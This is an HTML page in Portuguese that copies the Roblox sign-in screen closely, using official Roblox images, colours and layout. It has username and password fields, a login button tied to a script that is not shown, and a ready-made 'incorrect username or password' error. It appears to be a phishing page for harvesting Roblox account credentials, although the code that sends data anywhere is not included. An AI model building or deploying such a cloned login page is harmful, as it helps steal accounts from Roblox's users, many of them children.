<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    <style>
        /* IMPORTANDO FONTES E DEFININDO VARIÁVEIS DO SISTEMA FOUNDATION */
        @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');

        :root {
            /* CORES QUE VOCÊ ENVIOU - ESCALA CINZA */
            --bg-main: #121215;           /* color-extended-gray-1200 */
            --bg-card: #191a1f;           /* color-extended-gray-1100 */
            --bg-header: #202227;         /* color-extended-gray-1000 */
            --input-bg: #121215;
            
            /* CORES DE INTERAÇÃO */
            --rbx-blue: #335fff;          /* color-extended-blue-700 */
            --rbx-blue-hover: #528bff;    /* color-extended-blue-600 */
            --rbx-error: #df281f;         /* color-extended-red-800 */
            
            /* TIPOGRAFIA E BORDAS */
            --text-main: #ffffff;
            --text-muted: #bcbec8;
            --border-standard: rgba(255, 255, 255, 0.1);
            --radius-main: 8px;
        }

        /* ANIMAÇÕES DE SISTEMA */
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }

        @keyframes shake { 
            0%, 100% { transform: translateX(0); } 
            25% { transform: translateX(-5px); } 
            75% { transform: translateX(5px); } 
        }

        /* ESTRUTURA GLOBAL */
        body, html { 
            margin: 0; 
            padding: 0; 
            min-height: 100%; 
            font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, sans-serif; 
            background-color: var(--bg-main); 
            color: var(--text-main); 
            display: flex; 
            flex-direction: column; 
            overflow-x: hidden; 
        }

        /* CABEÇALHO OFICIAL */
        .roblox-header { 
            width: 100%; 
            height: 44px; 
            background: var(--bg-header); 
            display: flex; 
            align-items: center; 
            padding: 0 16px; 
            position: fixed; 
            top: 0; 
            z-index: 100; 
            box-sizing: border-box; 
            border-bottom: 1px solid var(--border-standard); 
        }

        .roblox-logo { 
            height: 28px; 
            width: 28px; 
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); 
            background-size: contain; 
            background-repeat: no-repeat; 
        }

        /* CONTEÚDO COM GRADIENTE DINÂMICO */
        .main-content { 
            flex: 1; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            flex-direction: column; 
            background: linear-gradient(rgba(0,0,0,0.45), rgba(0,0,0,0.45)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
            background-size: cover; 
            background-position: center; 
            padding: 80px 0 40px 0; 
        }

        /* CARD DE LOGIN PRO */
        .login-card { 
            background-color: var(--bg-card); 
            padding: 40px 32px; 
            border-radius: var(--radius-main); 
            width: 400px; 
            text-align: center; 
            box-shadow: 0 12px 40px rgba(0,0,0,0.7); 
            box-sizing: border-box; 
            position: relative; 
            backdrop-filter: blur(12px); 
        }

        .shield-icon { 
            background: url(https://images.rbxcdn.com/2b967a925b86540c43b97878bbfc0632-lock.svg) no-repeat center; 
            background-size: 60px; 
            width: 80px; 
            height: 80px; 
            margin: 0 auto 12px; 
        }

        h1 {
            margin-bottom: 24px;
            font-weight: 700;
            font-size: 24px;
            color: #fff;
        }

        /* MENSAGEM DE ERRO COM DESIGN DE ALERTA */
        #error-msg { 
            color: var(--rbx-error); 
            font-size: 13px; 
            margin-bottom: 15px; 
            display: none; 
            text-align: left; 
            background: rgba(223, 40, 31, 0.1); 
            padding: 12px; 
            border-radius: 4px; 
            border-left: 3px solid var(--rbx-error); 
        }

        /* CAMPOS DE INPUT */
        .input-field { 
            width: 100%; 
            height: 44px; 
            background-color: var(--input-bg); 
            border: 1px solid var(--border-standard); 
            border-radius: 4px; 
            color: #fff; 
            padding: 0 12px; 
            margin-bottom: 12px; 
            box-sizing: border-box; 
            outline: none; 
            transition: all 0.2s ease; 
            font-size: 15px; 
        }

        .input-field:focus { 
            border-color: #fff; 
        }

        /* BOTÃO PRIMÁRIO (AZUL FOUNDATION) */
        .btn-primary { 
            width: 100%; 
            height: 42px; 
            background-color: var(--rbx-blue); 
            color: #fff; 
            border: none; 
            border-radius: var(--radius-main); 
            font-size: 16px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 10px; 
            transition: background 0.2s ease; 
        }

        .btn-primary:hover { 
            background-color: var(--rbx-blue-hover); 
        }

        /* BOTÃO SECUNDÁRIO */
        .btn-secondary {
            width: 100%;
            height: 42px;
            background: #393b43;
            border: none;
            color: #fff;
            border-radius: var(--radius-main);
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn-secondary:hover {
            background: #45474d;
        }

        /* OVERLAY DE CARREGAMENTO */
        #loading-overlay { 
            background-color: rgba(0,0,0,0.85); 
            position: fixed; 
            inset: 0; 
            z-index: 2000; 
            display: none; 
            align-items: center; 
            justify-content: center; 
            backdrop-filter: blur(6px); 
        }

        .spinner { 
            width: 44px; 
            height: 44px; 
            border: 4px solid rgba(255,255,255,0.1); 
            border-top: 4px solid var(--rbx-blue); 
            border-radius: 50%; 
            animation: spin 0.8s linear infinite; 
        }

        .shake { 
            animation: shake 0.2s ease-in-out 0s 2; 
        }
    </style>
</head>
<body>

    <!-- ELEMENTO DE CARREGAMENTO -->
    <div id="loading-overlay">
        <div class="spinner"></div>
    </div>

    <!-- CABEÇALHO -->
    <header class="roblox-header">
        <div style="padding-left:10px">
            <div class="roblox-logo"></div>
        </div>
    </header>

    <!-- CONTEÚDO CENTRAL -->
    <main class="main-content">
        <div class="login-card" id="card">
            <div class="shield-icon"></div>
            <h1>Entrar na Roblox</h1>
            
            <!-- ALERTA DE ERRO -->
            <div id="error-msg">Usuário ou senha incorretos. Por favor, tente novamente.</div>

            <!-- FORMULÁRIO -->
            <input type="text" id="user" class="input-field" placeholder="Usuário / E-mail / Telefone" autocomplete="off" oninput="resetStyles()">
            <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="resetStyles()">
            
            <button class="btn-primary" onclick="execLogin()">Entrar</button>

            <!-- DIVISOR E ENTRADA RÁPIDA -->
            <div style="margin-top:24px; border-top:1px solid var(--border-standard); padding-top:20px">
                <button class="btn-secondary">Entrada rápida</button>
            </div>

            <!-- RODAPÉ DO CARD -->
            <p style="margin-top:25px; font-size:14px; color: var(--text-muted)">
                Não tem uma conta? 
                <a href="#" style="color:#fff; text-decoration:none; font-weight:700">Cadastrar-se</a>
            </p>
        </div>
    </main>
